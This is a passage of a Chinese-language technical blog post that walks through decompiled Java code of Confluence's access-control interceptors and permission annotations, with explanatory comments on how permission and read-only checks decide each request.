class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAccessPermitted</span><span class="params">(Object action, <span class="meta">@Nullable</span> String methodName)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (action <span class="keyword">instanceof</span> ConfluenceActionSupport) &#123;</span><br><span class="line">        <span class="type">ConfluenceActionSupport</span> <span class="variable">actionSupport</span> <span class="operator">=</span> (ConfluenceActionSupport)action;</span><br><span class="line">        <span class="type">ConfluenceUser</span> <span class="variable">currentUser</span> <span class="operator">=</span> AuthenticatedUserThreadLocal.get();</span><br><span class="line">        <span class="comment">// 跟踪</span></span><br><span class="line">        <span class="type">AccessDecision</span> <span class="variable">decision</span> <span class="operator">=</span> <span class="built_in">this</span>.checkUserAccessFromAnnotations(action.getClass(), methodName, currentUser);</span><br><span class="line">        <span class="keyword">switch</span> (decision) &#123;</span><br><span class="line">            <span class="keyword">case</span> GRANTED:</span><br><span class="line">                actionSupport.setSkipAccessCheck(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">case</span> DENIED:</span><br><span class="line">                <span class="built_in">this</span>.eventPublisher.publish(<span class="keyword">new</span> <span class="title class_">NoConfluencePermissionEvent</span>(<span class="built_in">this</span>));</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> AccessDecision <span class="title function_">checkUserAccessFromAnnotations</span><span class="params">(Class&lt;?&gt; actionClass, <span class="meta">@Nullable</span> String methodName, ConfluenceUser currentUser)</span> &#123;</span><br><span class="line">    Supplier&lt;AccessStatus&gt; accessStatusSupplier = Lazy.supplier(() -&gt; &#123;</span><br><span class="line">     <span class="comment">// 注意这里，根据user返回对应的权限，其值在AccessStatusImpl 结构中，有四个区之，详情见下面</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.confluenceAccessManager.getUserAccessStatus(currentUser);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// 获取目标方法/类/package 的注释</span></span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="built_in">this</span>.getOrderedAnnotatedElements(actionClass, methodName).iterator();</span><br><span class="line"></span><br><span class="line">    AccessDecision currentAccessDecision;</span><br><span class="line">    <span class="comment">// 如果没有注释，那么返回ABSTAIN</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!var5.hasNext()) &#123;</span><br><span class="line">            <span class="keyword">return</span> ActionAccessChecker.AccessDecision.ABSTAIN;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">AnnotatedElement</span> <span class="variable">annotatedElement</span> <span class="operator">=</span> (AnnotatedElement)var5.next();</span><br><span class="line">        currentAccessDecision = checkAccessAnnotations(annotatedElement, accessStatusSupplier);</span><br><span class="line">        <span class="comment">// 一直找到GRANTED/ DENIED的为止</span></span><br><span class="line">    &#125; <span class="keyword">while</span>(currentAccessDecision != ActionAccessChecker.AccessDecision.GRANTED &amp;&amp; currentAccessDecision != ActionAccessChecker.AccessDecision.DENIED);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> currentAccessDecision;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AccessStatusImpl结构</p><ul><li>LICENSED_ACCESS</li><li>UNLICENSED_AUTHENTICATED_ACCESS</li><li>ANONYMOUS_ACCESS</li><li>NOT_PERMITTED</li></ul><p><img src="/images/pasted-822.png" alt="upload successful"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> AccessDecision <span class="title function_">checkAccessAnnotations</span><span class="params">(AnnotatedElement annotatedElement, Supplier&lt;AccessStatus&gt; accessStatusSupplier)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">foundAccessCheckAnnotation</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">var3</span> <span class="operator">=</span> POSITIVE_ACCESS_CHECKS.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var3.hasNext()) &#123;</span><br><span class="line">            Map.Entry&lt;Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt;, Predicate&lt;AccessStatus&gt;&gt; accessCheckAnnotationEntry = (Map.Entry)var3.next();</span><br><span class="line">            <span class="keyword">if</span> (annotatedElement.isAnnotationPresent((Class)accessCheckAnnotationEntry.getKey())) &#123;</span><br><span class="line">                foundAccessCheckAnnotation = <span class="literal">true</span>;</span><br><span class="line">                Predicate&lt;AccessStatus&gt; accessCheckPredicate = (Predicate)accessCheckAnnotationEntry.getValue();</span><br><span class="line">                <span class="keyword">if</span> (accessCheckPredicate.apply(accessStatusSupplier.get())) &#123;</span><br><span class="line">                    <span class="keyword">return</span> ActionAccessChecker.AccessDecision.GRANTED;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (foundAccessCheckAnnotation) &#123;</span><br><span class="line">            <span class="keyword">return</span> ActionAccessChecker.AccessDecision.DENIED;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ActionAccessChecker.AccessDecision.ABSTAIN;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-823.png" alt="upload successful"></p><p>四个权限相关的注解</p><ul><li>PublicAccess: 所有都可访问</li><li>RequiresAnyConfluenceAccess: 对应LICENSED_ACCESS/UNLICENSED_AUTHENTICATED_ACCESS/ANONYMOUS_ACCESS</li><li>RequiresLicensedConfluenceAccess：对应LICENSED_ACCESS</li><li>RequiresLicensedOrAnonymousConfluenceAccess：对应LICENSED_ACCESS / UNLICENSED_AUTHENTICATED_ACCESS</li></ul><p>其对应的验证逻辑如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt;, Predicate&lt;AccessStatus&gt;&gt; POSITIVE_ACCESS_CHECKS = ImmutableMap.builder().put(PublicAccess.class, (accessStatus) -&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;).put(RequiresAnyConfluenceAccess.class, (accessStatus) -&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> accessStatus.canUseConfluence();</span><br><span class="line">&#125;).put(RequiresLicensedConfluenceAccess.class, (accessStatus) -&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> accessStatus.hasLicensedAccess();</span><br><span class="line">&#125;).put(RequiresLicensedOrAnonymousConfluenceAccess.class, (accessStatus) -&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> accessStatus.hasLicensedAccess() || accessStatus.hasAnonymousAccess();</span><br><span class="line">&#125;).build();</span><br></pre></td></tr></table></figure><p>举个注解的例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequiresAnyConfluenceAccess</span></span><br><span class="line"><span class="meta">@ReadOnlyAccessBlocked</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LikeAction</span> <span class="keyword">extends</span> <span class="title class_">ConfluenceActionSupport</span> &#123;</span><br></pre></td></tr></table></figure><h4 id="3-2-2-PageAwareInterceptor"><a href="#3-2-2-PageAwareInterceptor" class="headerlink" title="3.2.2 PageAwareInterceptor"></a>3.2.2 PageAwareInterceptor</h4><p>PageAwareInterceptor 也是权限相关，。总结：</p><blockquote><p>PageAwareInterceptor 是理解是负责confluence page权限的。</p></blockquote><p>看看具体的逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">intercept</span><span class="params">(ActionInvocation actionInvocation)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Ticker</span> <span class="variable">ignored</span> <span class="operator">=</span> Timers.start(<span class="string">&quot;PageAwareInterceptor.intercept()&quot;</span>);</span><br><span class="line">    <span class="type">Throwable</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Action</span> <span class="variable">action</span> <span class="operator">=</span> actionInvocation.getAction();</span><br><span class="line">        <span class="comment">// 如果不是Page 相关action，那么调用下一个interceptor</span></span><br><span class="line">        <span class="keyword">if</span> (!(action <span class="keyword">instanceof</span> PageAware)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">var23</span> <span class="operator">=</span> actionInvocation.invoke();</span><br><span class="line">            <span class="keyword">return</span> var23;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果是Page 相关action</span></span><br><span class="line">            <span class="type">PageAware</span> <span class="variable">pageAware</span> <span class="operator">=</span> (PageAware)action;</span><br><span class="line">            <span class="comment">// 判断对当前page是否有权限</span></span><br><span class="line">            <span class="comment">// </span></span><br><span class="line">            PageAwareHelper.<span class="type">Result</span> <span class="variable">result</span> <span class="operator">=</span> ((PageAwareHelper)<span class="built_in">this</span>.helperRef.get()).configure(pageAware, ServletActionContext.getRequest(), <span class="built_in">this</span>::getParameter);</span><br><span class="line">            String var7;</span><br><span class="line">            <span class="keyword">switch</span> (result) &#123;</span><br><span class="line">                <span class="keyword">case</span> NOT_PERMITTED:</span><br><span class="line">                    var7 = <span class="string">&quot;notpermitted&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> var7;</span><br><span class="line">                <span class="keyword">case</span> PAGE_NOT_PERMITTED:</span><br><span class="line">                    var7 = <span class="string">&quot;pagenotpermitted&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> var7;</span><br><span class="line">                <span class="keyword">case</span> PAGE_NOT_FOUND:</span><br><span class="line">                    var7 = <span class="string">&quot;pagenotfound&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> var7;</span><br><span class="line">                <span class="keyword">case</span> READ_ONLY:</span><br><span class="line">                    var7 = <span class="string">&quot;readonly&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> var7;</span><br><span class="line">                <span class="keyword">case</span> OK:</span><br><span class="line">                    var7 = actionInvocation.invoke();</span><br><span class="line">                    <span class="keyword">return</span> var7;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unhandled result type: &quot;</span> + result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>具体逻辑如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="meta">@NonNull</span> Result <span class="title function_">configure</span><span class="params">(PageAware pageAware, HttpServletRequest servletRequest, ParameterSource parameterSource)</span> &#123;</span><br><span class="line">    <span class="type">RequestHelper</span> <span class="variable">helper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestHelper</span>(parameterSource);</span><br><span class="line">    <span class="type">AbstractPage</span> <span class="variable">page</span> <span class="operator">=</span> helper.getPage();</span><br><span class="line">    <span class="type">AbstractPage</span> <span class="variable">draft</span> <span class="operator">=</span> helper.getDraft();</span><br><span class="line">    <span class="keyword">if</span> (page != <span class="literal">null</span> &amp;&amp; pageAware.isLatestVersionRequired()) &#123;</span><br><span class="line">        page = page.getLatestVersion();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (draft != <span class="literal">null</span> &amp;&amp; pageAware.isLatestVersionRequired() &amp;&amp; !draft.getLatestVersion().isDraft()) &#123;</span><br><span class="line">        page = draft.getLatestVersion();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">        log.debug(<span class="string">&quot;Set page on PageAware &quot;</span> + pageAware.getClass().getName() + <span class="string">&quot;: &quot;</span> + page);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (page != <span class="literal">null</span>) &#123;</span><br><span class="line">        pageAware.setPage(page);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Space</span> <span class="variable">space</span> <span class="operator">=</span> helper.getSpace(page);</span><br><span class="line">    <span class="keyword">if</span> (space == <span class="literal">null</span> &amp;&amp; StringUtils.isNotEmpty(helper.getSpaceKeyFromParameter()) || space != <span class="literal">null</span> &amp;&amp; !<span class="built_in">this</span>.permissionManager.hasPermission(AuthenticatedUserThreadLocal.get(), Permission.VIEW, space)) &#123;</span><br><span class="line">        <span class="keyword">return</span> AuthenticatedUserThreadLocal.get() == <span class="literal">null</span> ? PageAwareHelper.Result.NOT_PERMITTED : PageAwareHelper.Result.PAGE_NOT_FOUND;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (page == <span class="literal">null</span> &amp;&amp; pageAware.isPageRequired()) &#123;</span><br><span class="line">        <span class="keyword">return</span> PageAwareHelper.Result.PAGE_NOT_FOUND;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (page != <span class="literal">null</span> &amp;&amp; page.isDeleted() &amp;&amp; pageAware.isPageRequired()) &#123;</span><br><span class="line">        PageReference.set(servletRequest, page.getSpaceKey(), page.getTitle());</span><br><span class="line">        <span class="keyword">return</span> PageAwareHelper.Result.PAGE_NOT_FOUND;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (page == <span class="literal">null</span> || !pageAware.isPageRequired() || (!pageAware.isViewPermissionRequired() || <span class="built_in">this</span>.hasPermission(page, Permission.VIEW)) &amp;&amp; (!pageAware.isEditPermissionRequired() || <span class="built_in">this</span>.hasPermission(page, Permission.EDIT))) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((pageAware <span class="keyword">instanceof</span> CreatePageEntryAction || pageAware <span class="keyword">instanceof</span> CreateBlogPostAction) &amp;&amp; !((AbstractCreatePageAction)pageAware).isPermitted()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.accessModeService.isReadOnlyAccessModeEnabled() ? PageAwareHelper.Result.READ_ONLY : PageAwareHelper.Result.PAGE_NOT_PERMITTED;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (page != <span class="literal">null</span> &amp;&amp; space != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">hasVewPermissions</span> <span class="operator">=</span> <span class="built_in">this</span>.hasPermission(page, Permission.VIEW);</span><br><span class="line">                <span class="keyword">if</span> (hasVewPermissions) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.webResourceManager.putMetadata(<span class="string">&quot;page-title&quot;</span>, page.getTitle());</span><br><span class="line">                    <span class="built_in">this</span>.webResourceManager.putMetadata(<span class="string">&quot;latest-published-page-title&quot;</span>, page.getTitle());</span><br><span class="line">                    <span class="built_in">this</span>.webResourceManager.putMetadata(<span class="string">&quot;space-name&quot;</span>, space.getName());</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">this</span>.webResourceManager.putMetadata(<span class="string">&quot;page-id&quot;</span>, page.getIdAsString());</span><br><span class="line">                <span class="built_in">this</span>.webResourceManager.putMetadata(<span class="string">&quot;latest-page-id&quot;</span>, page.getLatestVersion().getIdAsString());</span><br><span class="line">                <span class="built_in">this</span>.webResourceManager.putMetadata(<span class="string">&quot;content-type&quot;</span>, page.getType());</span><br><span class="line">                <span class="type">String</span> <span class="variable">parentPageId</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (page <span class="keyword">instanceof</span> Page) &#123;</span><br><span class="line">                    <span class="type">Page</span> <span class="variable">p</span> <span class="operator">=</span> (Page)page;</span><br><span class="line">                    <span class="type">Page</span> <span class="variable">parent</span> <span class="operator">=</span> p.getParent();</span><br><span class="line">                    <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                        parentPageId = parent.getIdAsString();</span><br><span class="line">                        <span class="keyword">if</span> (hasVewPermissions) &#123;</span><br><span class="line">                            <span class="built_in">this</span>.webResourceManager.putMetadata(<span class="string">&quot;parent-page-title&quot;</span>, parent.getTitle());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">this</span>.webResourceManager.putMetadata(<span class="string">&quot;parent-page-id&quot;</span>, parentPageId);</span><br><span class="line">                <span class="built_in">this</span>.webResourceManager.putMetadata(<span class="string">&quot;space-key&quot;</span>, space.getKey());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (draft != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.webResourceManager.putMetadata(<span class="string">&quot;page-id&quot;</span>, draft.getIdAsString());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">this</span>.webResourceManager.putMetadata(<span class="string">&quot;max-number-editors&quot;</span>, String.valueOf(<span class="built_in">this</span>.collaborativeEditingHelper.getUserLimit()));</span><br><span class="line">            <span class="built_in">this</span>.webResourceManager.putMetadata(<span class="string">&quot;macro-placeholder-timeout&quot;</span>, Long.getLong(<span class="string">&quot;confluence.macro.placeholder.timeoutMillis&quot;</span>, <span class="number">5000L</span>).toString());</span><br><span class="line">            <span class="keyword">return</span> PageAwareHelper.Result.OK;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> PageAwareHelper.Result.PAGE_NOT_PERMITTED;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体不跟踪了，应该是confulence 文章/空间的权限问题。</p><h4 id="3-2-3-PermissionCheckInterceptor"><a href="#3-2-3-PermissionCheckInterceptor" class="headerlink" title="3.2.3 PermissionCheckInterceptor"></a>3.2.3 PermissionCheckInterceptor</h4><p>也是个权限相关的Interceptor，总结：</p><blockquote><p>PermissionCheckInterceptor 是检测读写行为相关的<br>逻辑1: 未安装完成时，都是可写的（未安装完成也无法开启只读模式）<br>逻辑2: 如果开启了只读模式（默认不启用，可以参考<a href="https://blog.csdn.net/u013587602/article/details/84926864%EF%BC%89">https://blog.csdn.net/u013587602/article/details/84926864）</a><br>   a. 如果action 的package / class / method 有ReadOnlyAccessBlocked 注解，那么返回readonly<br>    b. 默认返回readonly<br>    c. 逻辑3.a 中存在一种特殊情况<br>逻辑3: 如果action isPermitted 为false，默认返回”notpermitted”，除非一下情况<br>  a. 如果开启readonly只读模式，且是POST/PUT/DELETE 操作，而且namespace是/admin开头、或者package / class / method 有ReadOnlyAccessAllowed 注解，那么允许访问，否则返回readonly<br>   b. 如果是space 相关action，并且当前space 是私有的，那么返回”notpermittedpersonal”<br>逻辑4: 其他情况，返回ok</p></blockquote><p>看看具体逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">intercept</span><span class="params">(ActionInvocation actionInvocation)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Action</span> <span class="variable">action</span> <span class="operator">=</span> actionInvocation.getAction();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 同样，只处理 ConfluenceActionSupport 的Action，否则交由下一个Interceptor</span></span><br><span class="line">        <span class="keyword">if</span> (action <span class="keyword">instanceof</span> ConfluenceActionSupport) &#123;</span><br><span class="line">            <span class="type">ConfluenceActionSupport</span> <span class="variable">confluenceAction</span> <span class="operator">=</span> (ConfluenceActionSupport)action;</span><br><span class="line">            <span class="comment">// class</span></span><br><span class="line">            Class&lt;? <span class="keyword">extends</span> <span class="title class_">Action</span>&gt; actionClass = actionInvocation.getAction().getClass();</span><br><span class="line">            <span class="comment">// package</span></span><br><span class="line">            <span class="type">Package</span> <span class="variable">actionClassPackage</span> <span class="operator">=</span> actionClass.getPackage();</span><br><span class="line">            String var7;</span><br><span class="line">            <span class="comment">// 判断是否安装，并且启用了只读模式</span></span><br><span class="line">            <span class="keyword">if</span> (ContainerManager.isContainerSetup() &amp;&amp; <span class="built_in">this</span>.getAccessModeService().isReadOnlyAccessModeEnabled()) &#123;</span><br><span class="line">            <span class="comment">// 如果package或者class 有注解 ReadOnlyAccessBlocked</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.isAnnotated(actionClassPackage, <span class="string">&quot;ReadOnlyAccessBlocked&quot;</span>) || <span class="built_in">this</span>.isAnnotated(actionClass, <span class="string">&quot;ReadOnlyAccessBlocked&quot;</span>)) &#123;</span><br><span class="line">                <span class="comment">// 那么返回readonly</span></span><br><span class="line">                    <span class="type">String</span> <span class="variable">var13</span> <span class="operator">=</span> <span class="string">&quot;readonly&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> var13;</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">// method</span></span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="built_in">this</span>.getMethod(actionInvocation, actionClass);</span><br><span class="line">                <span class="comment">// 如果method有ReadOnlyAccessBlocked 注解，那么也返回readonly</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.isAnnotated(method, <span class="string">&quot;ReadOnlyAccessBlocked&quot;</span>)) &#123;</span><br><span class="line">                    var7 = <span class="string">&quot;readonly&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> var7;</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">// 判断：如果namespace 是/admin，或者class / package/ method 有ReadOnlyAccessAllowed 注解，那么启用线程readonly 设置为true</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.isReadOnlyAccessAllowed(actionInvocation, actionClassPackage, actionClass)) &#123;</span><br><span class="line">                    ThreadLocalReadOnlyAccessCacheInternal.enableReadOnlyAccessExemption();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line"><span class="comment">// 具体看下面的逻辑 </span></span><br><span class="line">            <span class="comment">// 如果没有权限</span></span><br><span class="line">            <span class="keyword">if</span> (!confluenceAction.isPermitted()) &#123;</span><br><span class="line">                log.debug(<span class="string">&quot;Not permitted to execute action of class &#123;&#125; &quot;</span>, confluenceAction.getClass());</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ServletActionContext.getRequest();</span><br><span class="line">                <span class="comment">// 如果启用了只读模式，并且当前http method为PUT/POST/DELETE</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.getAccessModeService().isReadOnlyAccessModeEnabled() &amp;&amp; <span class="built_in">this</span>.isMutativeHttpMethod(request.getMethod())) &#123;</span><br><span class="line">                <span class="comment">// 获取当前线程下的readonly变量，如果为true，那么不做操作，继续下一个，否则返回readonly</span></span><br><span class="line">                    var7 = ThreadLocalReadOnlyAccessCacheInternal.hasReadOnlyAccessExemption() ? actionInvocation.invoke() : <span class="string">&quot;readonly&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> var7;</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">// 如果是space相关action，判断当前space是否是私人项目，如果是，返回&quot;notpermittedpersonal&quot;</span></span><br><span class="line">                <span class="keyword">if</span> (confluenceAction <span class="keyword">instanceof</span> Spaced &amp;&amp; ((Spaced)confluenceAction).getSpace() != <span class="literal">null</span> &amp;&amp; ((Spaced)confluenceAction).getSpace().isPersonal()) &#123;</span><br><span class="line">                    var7 = <span class="string">&quot;notpermittedpersonal&quot;</span>;</span><br><span class="line">                    <span 